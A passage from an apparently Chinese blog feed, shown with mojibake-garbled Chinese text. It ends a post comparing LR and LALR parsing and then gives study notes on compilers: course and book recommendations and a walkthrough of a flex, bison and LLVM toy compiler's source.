<h5 id="2-LR-1-ä¸LR-0-çš„å…³ç³»ï¼š"><a href="#2-LR-1-ä¸LR-0-çš„å…³ç³»ï¼š" class="headerlink" title="2.  LR(1)ä¸LR(0)çš„å…³ç³»ï¼š"></a>2.  LR(1)ä¸LR(0)çš„å…³ç³»ï¼š</h5><p>è§„èŒƒLRï¼ˆ1ï¼‰è¯­æ³•åˆ†ææŠ€æœ¯çš„ä¸­å¿ƒæ€æƒ³æ˜¯æ ¹æ®æ–‡æ³•æ„é€ å‡ºLRï¼ˆ1ï¼‰è‡ªåŠ¨æœº ï¼Œè€Œè§„èŒƒLRï¼ˆ1ï¼‰è‡ªåŠ¨æœºæ„é€ æ–¹æ³•å’ŒLRï¼ˆ0ï¼‰è‡ªåŠ¨æœºçš„æ„é€ æ–¹æ³•ç›¸åŒï¼Œåªæ˜¯å¤šå¢åŠ äº†å‘å‰æœç´¢ç¬¦å·ã€‚</p>
<h5 id="3-è§„èŒƒLR-1-ä¸LALR-1-çš„å…³ç³»ï¼š"><a href="#3-è§„èŒƒLR-1-ä¸LALR-1-çš„å…³ç³»ï¼š" class="headerlink" title="3. è§„èŒƒLR(1)ä¸LALR(1)çš„å…³ç³»ï¼š"></a>3. è§„èŒƒLR(1)ä¸LALR(1)çš„å…³ç³»ï¼š</h5><p>LALR(1)æ˜¯å¯¹LR(1)é¡¹é›†æ—Iä¸­å…·æœ‰åŒå¿ƒé¡¹çš„é¡¹é›†è¿›è¡Œåˆå¹¶å¾—åˆ°Iâ€™ï¼Œç„¶åæ ¹æ®Iâ€™è¿›è¡Œåˆ†æçš„æ–¹æ³•ã€‚</p>
<h5 id="4-å„ç§æ–‡æ³•èƒ½åŠ›çš„å¯¹æ¯”"><a href="#4-å„ç§æ–‡æ³•èƒ½åŠ›çš„å¯¹æ¯”" class="headerlink" title="4. å„ç§æ–‡æ³•èƒ½åŠ›çš„å¯¹æ¯”"></a>4. å„ç§æ–‡æ³•èƒ½åŠ›çš„å¯¹æ¯”</h5><p><img src="http://blogimg-10065924.cossh.myqcloud.com/compilers/111.png" alt="cmp"></p>
<h4 id="0x03-å¼•ç”¨"><a href="#0x03-å¼•ç”¨" class="headerlink" title="0x03: å¼•ç”¨"></a>0x03: å¼•ç”¨</h4><p><a href="https://www.cnblogs.com/yongzhewudi/p/6048301.html" target="_blank" rel="noopener">LL LR SLR LALR å‚»å‚»åˆ†ä¸æ¸…</a></p>
<p><a href="http://blog.csdn.net/linraise/article/details/9237195" target="_blank" rel="noopener">ç¼–è¯‘åŸç†:LL(1),LR(0),SLR(1),LALR(1),LR(1)å¯¹æ¯”</a></p>
<p><a href="http://blog.csdn.net/carino_ly/article/details/24097889" target="_blank" rel="noopener">å¦‚ä½•åˆ¤æ–­æ–‡æ³•æ˜¯LL(1)SLR(1)LR(1)LALR(1)çš„ï¼Ÿ</a></p>
<p><a href="https://zh.wikipedia.org/wiki/LALR%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E5%99%A8" target="_blank" rel="noopener">ç»´åŸºç™¾ç§‘</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;æ’¸å…¬å¼€è¯¾çš„æ—¶å€™è¢«è¿™å‡ ä¸ªæ–‡æ³•ç»•æ™•äº†ã€‚æœäº†å¾ˆå¤šä¸œè¥¿ï¼Œåˆå¹¶æ•´ç†æ–¹ä¾¿åç»­æŸ¥çœ‹ã€‚
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="ç¼–è¯‘åŸç†" scheme="http://o0xmuhe.me/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>compilerå­¦ä¹ </title>
    <link href="http://o0xmuhe.me/2018/01/20/compiler%E5%AD%A6%E4%B9%A0/"/>
    <id>http://o0xmuhe.me/2018/01/20/compilerå­¦ä¹ /</id>
    <published>2018-01-20T07:36:41.000Z</published>
    <updated>2018-05-27T07:12:24.094Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00:å‰è¨€"></a>0x00:å‰è¨€</h4><p>ä¸€ç›´æƒ³åšçš„fuzzeræ¶‰åŠåˆ°å¾ˆå¤šè¯­æ³•ç›¸å…³çš„ä¸œè¥¿ï¼Œç¼–è¯‘åŸç†ç›¸å…³çš„è¡¥è¯¾è¿«åœ¨çœ‰ç«-ã€‚- ä¸è¿‡ä¹Ÿåªèƒ½æ…¢æ…¢çš„æ¥å­¦ä¹ ã€‚è¿™ç¯‡æ–‡ç« å‡†å¤‡æ…¢æ…¢æ›´æ–°ï¼Œæ¶‰åŠæˆ‘çš„å­¦ä¹ è¿‡ç¨‹å’Œå¯¹ä»¥å‰çš„å¤§ä½¬çš„ä¸€ä¸ªtoy compilerçš„å­¦ä¹ ï¼Œç†è®º+å®è·µæ‰æ˜¯ç‹é“ã€‚</p>
<a id="more"></a>
<h4 id="0x01-å…³äºå­¦ä¹ "><a href="#0x01-å…³äºå­¦ä¹ " class="headerlink" title="0x01:å…³äºå­¦ä¹ "></a>0x01:å…³äºå­¦ä¹ </h4><h5 id="1-å…¬å¼€è¯¾"><a href="#1-å…¬å¼€è¯¾" class="headerlink" title="1. å…¬å¼€è¯¾"></a>1. å…¬å¼€è¯¾</h5><h6 id="1-1-å“ˆå·¥å¤§çš„ç¼–è¯‘åŸç†"><a href="#1-1-å“ˆå·¥å¤§çš„ç¼–è¯‘åŸç†" class="headerlink" title="1.1 å“ˆå·¥å¤§çš„ç¼–è¯‘åŸç†"></a>1.1 å“ˆå·¥å¤§çš„ç¼–è¯‘åŸç†</h6><p>é™ˆè€å¸ˆè®²çš„è¶…çº§å¥½ï½æ…¢æ…¢çœ‹ï¼Œçœ‹äº†ä¸‹ï¼Œè¿™ä¸ªæ˜¯åŸºäºé¾™ä¹¦è®²çš„ï¼Œå½“ç„¶æ²¡æœ‰å±•å¼€å¾ˆå¤šï¼Œè¿˜æ˜¯éœ€è¦å¤šä¸‹åŠŸå¤«å»çœ‹çœ‹ï¼›</p>
<h6 id="1-2-ä¸­ç§‘å¤§ç¼–è¯‘åŸç†è¯¾ç¨‹"><a href="#1-2-ä¸­ç§‘å¤§ç¼–è¯‘åŸç†è¯¾ç¨‹" class="headerlink" title="1.2 ä¸­ç§‘å¤§ç¼–è¯‘åŸç†è¯¾ç¨‹"></a>1.2 ä¸­ç§‘å¤§ç¼–è¯‘åŸç†è¯¾ç¨‹</h6><p>è¿™ä¸ªä¹Ÿè¡Œï¼Œé€šä¿—æ˜“æ‡‚ï¼Œä½†æ˜¯ä¸ªäººæ„Ÿè§‰æ²¡æœ‰å“ˆå·¥å¤§é‚£ä¸ªè¯¾ç¨‹å…¨é¢ã€‚</p>
<h6 id="ç»¼åˆ"><a href="#ç»¼åˆ" class="headerlink" title="ç»¼åˆ"></a>ç»¼åˆ</h6><p>ä¸ªäººæ„Ÿè§‰ï¼Œæ¦‚å¿µå¤ªå¤šï¼Œæ¶‰åŠçš„çŸ¥è¯†æ‚è€Œå¹¿ï¼Œæ‰€ä»¥æœ‰ä¸ªå¤§æ¦‚å°è±¡ï¼Œéœ€è¦ä»€ä¹ˆçš„æ—¶å€™å†æ·±å…¥çœ‹ä¼šæ¯”è¾ƒå¥½ä¸€ç‚¹ã€‚</p>
<h5 id="2-ä¹¦"><a href="#2-ä¹¦" class="headerlink" title="2. ä¹¦"></a>2. ä¹¦</h5><h6 id="2-1-é¾™ä¹¦"><a href="#2-1-é¾™ä¹¦" class="headerlink" title="2.1 é¾™ä¹¦"></a>2.1 é¾™ä¹¦</h6><pre><code>æˆ‘æ˜¯çœ‹ä¸ä¸‹å»...å¥½æ¯ç‡¥ï¼Œä¹Ÿå°±ä¸‹äº†ä¸ªpdfï¼Œçœ‹å…¬å¼€è¯¾çš„æ—¶å€™ç”¨æ¥å½“å‚è€ƒï¼Œä¸€äº›æ¦‚å¿µè®°ä¸æ¸…äº†å°±å»ç¿»ä¸€ç¿»å•¥çš„ã€‚
</code></pre><h6 id="2-2-ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹"><a href="#2-2-ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹" class="headerlink" title="2.2 ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹"></a>2.2 ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹</h6><pre><code>è¿™æœ¬ä¸é”™ï¼Œå®è·µçš„ä¸€æœ¬ä¹¦ï¼Œä¸è¿‡ï¼Œæ²¡æœ‰çœ‹è¿‡ä¸€äº›åŸºç¡€å†…å®¹çš„å°±åˆ«çœ‹äº†ï¼Œè¿™æœ¬ä¹¦æ²¡ä»€ä¹ˆå¤ªå¤šçš„åŸºç¡€å†…å®¹ä»‹ç»ï¼Œå°±æ˜¯ä¸Šæ¥å°±ä»è¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€ä»£ç ç”Ÿæˆä¸€ç‚¹ä¸€ç‚¹åœ°æ‹¿ä»£ç ç»™ä½ è®²ï¼›æ˜¯ç”¨javaå®ç°çš„ä¸€ä¸ªç±»cè¯­è¨€çš„ä¸€ä¸ªç¼–è¯‘å™¨ã€‚æ‰€ä»¥è¿™æœ¬æˆ‘æ˜¯æ”¾åœ¨åé¢ä¸€ç‚¹çš„ä½ç½®å†å»çœ‹çš„ï¼ŒåŸºæœ¬çœ‹å®Œï¼Œä½†æ˜¯éœ€è¦ç»“åˆå»çœ‹ä»–çš„ä»£ç ï¼Œè¿˜éœ€è¦ä»”ç»†è¿‡ä¸€è¿‡ã€‚
</code></pre><h6 id="2-3-flexä¸bison"><a href="#2-3-flexä¸bison" class="headerlink" title="2.3 flexä¸bison"></a>2.3 flexä¸bison</h6><pre><code>è¿™ä¸ªä¸é”™ä¸¤ç™¾å¤šé¡µçš„å°è–„æœ¬ï¼Œä½†æ˜¯å†…å®¹å¾ˆå¤šï¼Œä»£ç è¦å¥½å¥½æ¶ˆåŒ–ï¼Œè¿˜æ˜¯é‚£å¥è¯ï¼Œæ²¡æœ‰åŸºç¡€çŸ¥è¯†(from é¾™ä¹¦orå…¬å¼€è¯¾)ï¼Œå°±ç®—äº†ï¼Œè¦ä¸ç„¶çœ‹åˆ°ä½œè€…å†™çš„é‚£äº›ä»£ç ç†è§£èµ·æ¥å¾ˆè´¹åŠ²ã€‚è¿™æœ¬åªçœ‹äº†éƒ¨åˆ†ï¼Œåªåˆ°sqlé‚£ä¸ªåˆ†æã€‚
</code></pre><h6 id="2-4-ç°ä»£ç¼–è¯‘å™¨-è™ä¹¦"><a href="#2-4-ç°ä»£ç¼–è¯‘å™¨-è™ä¹¦" class="headerlink" title="2.4 ç°ä»£ç¼–è¯‘å™¨(è™ä¹¦)"></a>2.4 ç°ä»£ç¼–è¯‘å™¨(è™ä¹¦)</h6><pre><code>åå®è·µçš„ä¸€æœ¬ï¼Œä½†æ˜¯æˆ‘æ²¡çœ‹ 233333
</code></pre><h6 id="2-5-Antlr4-æƒå¨æŒ‡å—"><a href="#2-5-Antlr4-æƒå¨æŒ‡å—" class="headerlink" title="2.5 Antlr4 æƒå¨æŒ‡å—"></a>2.5 Antlr4 æƒå¨æŒ‡å—</h6><pre><code>æœ‰ä¸€å®šåŸºç¡€ï¼Œæ¨èçœ‹ã€‚ç»“åˆantlr4å¯ä»¥å¾ˆå¿«ä¸Šæ‰‹ï½ è€Œä¸”è¿™ä¸ªä¸œè¥¿åº”ç”¨ååˆ†å¹¿æ³› -ã€‚- æ¯”å¦‚åœ¨bug huntingçš„éƒ¨åˆ†ï½
</code></pre><h5 id="3-å®è·µé¡¹ç›®"><a href="#3-å®è·µé¡¹ç›®" class="headerlink" title="3. å®è·µé¡¹ç›®"></a>3. å®è·µé¡¹ç›®</h5><h6 id="3-1-ä¸€ä¸ªå¤–å›½äººå†™çš„toy-compilerï¼Œbased-on-llvm"><a href="#3-1-ä¸€ä¸ªå¤–å›½äººå†™çš„toy-compilerï¼Œbased-on-llvm" class="headerlink" title="3.1 ä¸€ä¸ªå¤–å›½äººå†™çš„toy compilerï¼Œbased on llvm"></a>3.1 <a href="https://gnuu.org/2009/09/18/writing-your-own-toy-compiler/" target="_blank" rel="noopener">ä¸€ä¸ªå¤–å›½äººå†™çš„toy compilerï¼Œbased on llvm</a></h6><h6 id="3-2-ã€Šflexä¸bisonã€‹ä¸­çš„é‚£ä¸ªsqlçš„è§£ææŒºä¸é”™çš„"><a href="#3-2-ã€Šflexä¸bisonã€‹ä¸­çš„é‚£ä¸ªsqlçš„è§£ææŒºä¸é”™çš„" class="headerlink" title="3.2 ã€Šflexä¸bisonã€‹ä¸­çš„é‚£ä¸ªsqlçš„è§£ææŒºä¸é”™çš„"></a>3.2 ã€Šflexä¸bisonã€‹ä¸­çš„é‚£ä¸ªsqlçš„è§£ææŒºä¸é”™çš„</h6><h6 id="3-3-ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹ä¸­çš„cbc"><a href="#3-3-ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹ä¸­çš„cbc" class="headerlink" title="3.3 ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹ä¸­çš„cbc"></a>3.3 ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹ä¸­çš„cbc</h6><h6 id="3-4-llvm-æ–‡æ¡£ä¸­çš„Kaleidoscope"><a href="#3-4-llvm-æ–‡æ¡£ä¸­çš„Kaleidoscope" class="headerlink" title="3.4 llvm æ–‡æ¡£ä¸­çš„Kaleidoscope"></a>3.4 llvm æ–‡æ¡£ä¸­çš„Kaleidoscope</h6><h6 id="3-5-æ‰‹æŠŠæ‰‹æ•™ä½ æ„å»º-C-è¯­è¨€ç¼–è¯‘å™¨"><a href="#3-5-æ‰‹æŠŠæ‰‹æ•™ä½ æ„å»º-C-è¯­è¨€ç¼–è¯‘å™¨" class="headerlink" title="3.5 æ‰‹æŠŠæ‰‹æ•™ä½ æ„å»º C è¯­è¨€ç¼–è¯‘å™¨"></a>3.5 <a href="http://lotabout.me/2015/write-a-C-interpreter-0/" target="_blank" rel="noopener">æ‰‹æŠŠæ‰‹æ•™ä½ æ„å»º C è¯­è¨€ç¼–è¯‘å™¨</a></h6><h4 id="0x02-toy-compilerå­¦ä¹ "><a href="#0x02-toy-compilerå­¦ä¹ " class="headerlink" title="0x02 : toy compilerå­¦ä¹ "></a>0x02 : toy compilerå­¦ä¹ </h4><h5 id="1-åŸºæœ¬æƒ…å†µ"><a href="#1-åŸºæœ¬æƒ…å†µ" class="headerlink" title="1. åŸºæœ¬æƒ…å†µ"></a>1. åŸºæœ¬æƒ…å†µ</h5><p>è€å¤–å†™çš„ä¸€ä¸ªç®€æ˜“çš„compilerï¼Œä½¿ç”¨flex+bisonåšå‰ç«¯ï¼Œllvmåç«¯ä»£ç ç”Ÿæˆçš„ä¸€ä¸ªdemoã€‚</p>
<p><a href="https://gnuu.org/2009/09/18/writing-your-own-toy-compiler/" target="_blank" rel="noopener">writing-your-own-toy-compiler</a></p>
<p><a href="https://github.com/lsegal/my_toy_compiler" target="_blank" rel="noopener">ä»£ç åœ¨GitHubä¸Šå¯ä»¥æ‰¾åˆ°</a></p>
<h5 id="2-é¡¹ç›®ç»“æ„"><a href="#2-é¡¹ç›®ç»“æ„" class="headerlink" title="2. é¡¹ç›®ç»“æ„"></a>2. é¡¹ç›®ç»“æ„</h5><p>ç¨å¾®å¤æ‚ä¸€äº›ã€å¤§ä¸€äº›çš„é¡¹ç›®ï¼Œé˜…è¯»ä¹‹å‰æœ€å¥½ææ˜ç™½é¡¹ç›®çš„ç»“æ„ï¼Œè¿™ä¸ªtoy compilerè™½ç„¶ä»£ç é‡ä¸å¤§ï¼Œä½†æ˜¯æœ€å¥½è¿˜æ˜¯ææ˜ç™½ç»“æ„ï¼Œæ–¹ä¾¿åé¢çš„é˜…è¯»ã€‚</p>
<p>ç¼–è¯‘çš„æµç¨‹æ˜¯è¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æã€ä»£ç ç”Ÿæˆã€‚</p>
<p>æ ¹æ®è¿™ä¸ªè¿‡ç¨‹å»åˆ†(æœ‰äº›å¤´æ–‡ä»¶åœ¨ä¸åŒçš„è¿‡ç¨‹ä¸­éƒ½ä¼šç”¨åˆ°ï¼Œæ¯”å¦‚node.h)ï¼š</p>
<ul>
<li><p>è¯æ³•åˆ†æ</p>
<p>tokens.l ã€parser.hppã€node.h</p>
</li>
<li><p>è¯­æ³•åˆ†æ</p>
<p>parser.yã€node.h</p>
</li>
<li><p>ä»£ç ç”Ÿæˆ</p>
<p>codegen.cppã€codegen.hã€corefn.cpp</p>
</li>
<li><p>å…¶ä»–</p>
<p>main.cpp toy compilerçš„ä¸»ä½“</p>
<p>example.txt æµ‹è¯•ç”¨ä¾‹</p>
</li>
</ul>
<h5 id="3-ä»£ç é˜…è¯»å­¦ä¹ "><a href="#3-ä»£ç é˜…è¯»å­¦ä¹ " class="headerlink" title="3. ä»£ç é˜…è¯»å­¦ä¹ "></a>3. ä»£ç é˜…è¯»å­¦ä¹ </h5><h6 id="3-1-ä¸»ä½“éƒ¨åˆ†-main-cpp"><a href="#3-1-ä¸»ä½“éƒ¨åˆ†-main-cpp" class="headerlink" title="3.1 ä¸»ä½“éƒ¨åˆ† main.cpp"></a>3.1 ä¸»ä½“éƒ¨åˆ† main.cpp</h6><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">yyparse();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; programBlock &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">// see http://comments.gmane.org/gmane.comp.compilers.llvm.devel/33877</span></span><br><span class="line">InitializeNativeTarget();</span><br><span class="line">InitializeNativeTargetAsmPrinter();</span><br><span class="line">InitializeNativeTargetAsmParser();</span><br><span class="line">CodeGenContext context;</span><br><span class="line">createCoreFunctions(context);</span><br><span class="line">context.generateCode(*programBlock);</span><br><span class="line">context.runCode();</span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨yyparseè§£æè¾“å…¥ï¼Œç„¶åè¾“å‡ºprogranblockä¹‹åï¼Œä½¿ç”¨llvmåšä»£ç ç”Ÿæˆã€‚</p>
<h6 id="3-2-è¯æ³•åˆ†æ"><a href="#3-2-è¯æ³•åˆ†æ" class="headerlink" title="3.2 è¯æ³•åˆ†æ"></a>3.2 è¯æ³•åˆ†æ</h6><p>è¯æ³•åˆ†ææ˜¯ä½¿ç”¨flexåšçš„ï¼Œè¯æ³•åˆ†ææ˜¯æŠŠè¾“å…¥åˆ†å‰²æˆtokenåºåˆ—ï¼Œåœ¨tokens.lä¸­ï¼Œå®šä¹‰äº†å„ç§tokenã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[ \t\n]                            ;</span><br><span class="line">&quot;extern&quot;                        return TOKEN(TEXTERN);</span><br><span class="line">&quot;return&quot;                        return TOKEN(TRETURN);</span><br><span class="line">[a-zA-Z_][a-zA-Z0-9_]*  SAVE_TOKEN; return TIDENTIFIER;</span><br><span class="line">[0-9]+\.[0-9]*                 SAVE_TOKEN; return TDOUBLE;</span><br><span class="line">[0-9]+                            SAVE_TOKEN; return TINTEGER;</span><br><span class="line"></span><br><span class="line">&quot;=&quot;                                  return TOKEN(TEQUAL);</span><br><span class="line">&quot;==&quot;                              return TOKEN(TCEQ);</span><br><span class="line">&quot;!=&quot;                              return TOKEN(TCNE);</span><br><span class="line">&quot;&lt;&quot;                                  return TOKEN(TCLT);</span><br><span class="line">&quot;&lt;=&quot;                              return TOKEN(TCLE);</span><br><span class="line">&quot;&gt;&quot;                                  return TOKEN(TCGT);</span><br><span class="line">&quot;&gt;=&quot;                              return TOKEN(TCGE);</span><br><span class="line"></span><br><span class="line">&quot;(&quot;                                  return TOKEN(TLPAREN);</span><br><span class="line">&quot;)&quot;                                  return TOKEN(TRPAREN);</span><br><span class="line">&quot;&#123;&quot;                                 return TOKEN(TLBRACE);</span><br><span class="line">&quot;&#125;&quot;                                  return TOKEN(TRBRACE);</span><br><span class="line"></span><br><span class="line">&quot;.&quot;                                 return TOKEN(TDOT);</span><br><span class="line">&quot;,&quot;                                  return TOKEN(TCOMMA);</span><br><span class="line"></span><br><span class="line">&quot;+&quot;                                  return TOKEN(TPLUS);</span><br><span class="line">&quot;-&quot;                                  return TOKEN(TMINUS);</span><br><span class="line">&quot;*&quot;                                  return TOKEN(TMUL);</span><br><span class="line">&quot;/&quot;                                  return TOKEN(TDIV);</span><br></pre></td></tr></table></figure>
<p>åŒ¹é…çš„è¯å°±æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„é‚£ç§åŒ¹é…åŸåˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æºç é‡Œé‡åˆ°äº†å¯¹åº”çš„tokenï¼Œå°±è¿”å›{å­—é¢å€¼ï¼ŒTOKENå}è¿™æ ·çš„åºåˆ—ã€‚ä¸åŒçš„tokenç±»å‹ï¼Œåœ¨parser.hppä¸­å®šä¹‰(å®å®šä¹‰)ã€‚</p>
<h6 id="3-2-è¯­æ³•åˆ†æ"><a href="#3-2-è¯­æ³•åˆ†æ" class="headerlink" title="3.2 è¯­æ³•åˆ†æ"></a>3.2 è¯­æ³•åˆ†æ</h6><p>è¿™éƒ¨åˆ†æ˜¯ä½¿ç”¨äº†bisonï¼Œä»tokenåºåˆ—ä¾ç…§æå‰å®šä¹‰å¥½çš„è¯­æ³•è§„åˆ™ï¼Œç”Ÿæˆå¯¹åº”çš„astã€‚</p>
<p>è§„åˆ™åœ¨parser.yé‡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">program : stmts &#123; programBlock = $1; &#125;</span><br><span class="line">        ;</span><br><span class="line">        </span><br><span class="line">stmts : stmt &#123; $$ = new NBlock(); $$-&gt;statements.push_back($&lt;stmt&gt;1); &#125;</span><br><span class="line">      | stmts stmt &#123; $1-&gt;statements.push_back($&lt;stmt&gt;2); &#125;</span><br><span class="line">      ;</span><br><span class="line"></span><br><span class="line">stmt : var_decl | func_decl | extern_decl</span><br><span class="line">     | expr &#123; $$ = new NExpressionStatement(*$1); &#125;</span><br><span class="line">     | TRETURN expr &#123; $$ = new NReturnStatement(*$2); &#125;</span><br><span class="line">     ;</span><br><span class="line"></span><br><span class="line">block : TLBRACE stmts TRBRACE &#123; $$ = $2; &#125;</span><br><span class="line">      | TLBRACE TRBRACE &#123; $$ = new NBlock(); &#125;</span><br><span class="line">      ;</span><br><span class="line"></span><br><span class="line">var_decl : ident ident &#123; $$ = new NVariableDeclaration(*$1, *$2); &#125;</span><br><span class="line">         | ident ident TEQUAL expr &#123; $$ = new NVariableDeclaration(*$1, *$2, $4); &#125;</span><br><span class="line">         ;</span><br><span class="line"></span><br><span class="line">extern_decl : TEXTERN ident ident TLPAREN func_decl_args TRPAREN</span><br><span class="line">                &#123; $$ = new NExternDeclaration(*$2, *$3, *$5); delete $5; &#125;</span><br><span class="line">            ;</span><br><span class="line"></span><br><span class="line">func_decl : ident ident TLPAREN func_decl_args TRPAREN block </span><br><span class="line">            &#123; $$ = new NFunctionDeclaration(*$1, *$2, *$4, *$6); delete $4; &#125;</span><br><span class="line">          ;</span><br></pre></td></tr></table></figure>
<p>å¯¹è¡¨è¾¾å¼ã€ä»£ç å—ã€å˜é‡å®šä¹‰ï¼Œéƒ½æœ‰å¯¹åº”çš„è¯­æ³•è§„åˆ™ã€‚</p>
<p>ä½œè€…è®¾è®¡çš„aståœ¨node.hä¸­ï¼Œå¯¹äºä¸åŒçš„è¯­å¥ï¼Œå¯¹åº”çš„astä¹Ÿä¸åŒï¼Œè¿™é‡Œä¸¾ä¾‹äº†è¡¨è¾¾å¼å£°æ˜å’Œå˜é‡å£°æ˜çš„astè®¾è®¡ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¡¨è¾¾å¼å£°æ˜</span></span><br><span class="line"><span class="keyword">class</span> NExpressionStatement : <span class="keyword">public</span> NStatement &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    NExpression&amp; expression;</span><br><span class="line">    NExpressionStatement(NExpression&amp; expression) : </span><br><span class="line">        expression(expression) &#123; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> llvm::<span class="function">Value* <span class="title">codeGen</span><span class="params">(CodeGenContext&amp; context)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å˜é‡å£°æ˜ï¼Œä¸¤ä¸ªæ„é€ æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment">//ç±»å‹ å˜é‡å</span></span><br><span class="line"><span class="comment">//ç±»å‹ å˜é‡å = åˆå§‹å€¼</span></span><br><span class="line"><span class="keyword">class</span> NVariableDeclaration : <span class="keyword">public</span> NStatement &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> NIdentifier&amp; type;</span><br><span class="line">    NIdentifier&amp; id;</span><br><span class="line">    NExpression *assignmentExpr;</span><br><span class="line">    NVariableDeclaration(<span class="keyword">const</span> NIdentifier&amp; type, NIdentifier&amp; id) :</span><br><span class="line">        type(type), id(id) &#123; assignmentExpr = <span class="literal">NULL</span>; &#125;</span><br><span class="line">    NVariableDeclaration(<span class="keyword">const</span> NIdentifier&amp; type, NIdentifier&amp; id, NExpression *assignmentExpr) :</span><br><span class="line">        type(type), id(id), assignmentExpr(assignmentExpr) &#123; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> llvm::<span class="function">Value* <span class="title">codeGen</span><span class="params">(CodeGenContext&amp; context)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> NExternDeclaration : <span class="keyword">public</span> NStatement &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> NIdentifier&amp; type;</span><br><span class="line">    <span class="keyword">const</span> NIdentifier&amp; id;</span><br><span class="line">    VariableList arguments;</span><br><span class="line">    NExternDeclaration(<span class="keyword">const</span> NIdentifier&amp; type, <span class="keyword">const</span> NIdentifier&amp; id,</span><br><span class="line">            <span class="keyword">const</span> VariableList&amp; arguments) :</span><br><span class="line">        type(type), id(id), arguments(arguments) &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> llvm::<span class="function">Value* <span class="title">codeGen</span><span class="params">(CodeGenContext&amp; context)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="3-3-ä»£ç ç”Ÿæˆ-è¿˜åœ¨çœ‹"><a href="#3-3-ä»£ç ç”Ÿæˆ-è¿˜åœ¨çœ‹" class="headerlink" title="3.3 ä»£ç ç”Ÿæˆ(è¿˜åœ¨çœ‹)"></a>3.3 ä»£ç ç”Ÿæˆ(è¿˜åœ¨çœ‹)</h6><p>è¿™éƒ¨åˆ†å¦‚æœçº¯è‡ªå·±åšçš„è¯ï¼Œæ€•æ˜¯è¦å†™å¥½ä¹…äº†ï¼Œå¦‚æœä½¿ç”¨llvmçš„è¯ï¼Œå°±å¿«å¾ˆå¤šã€‚</p>
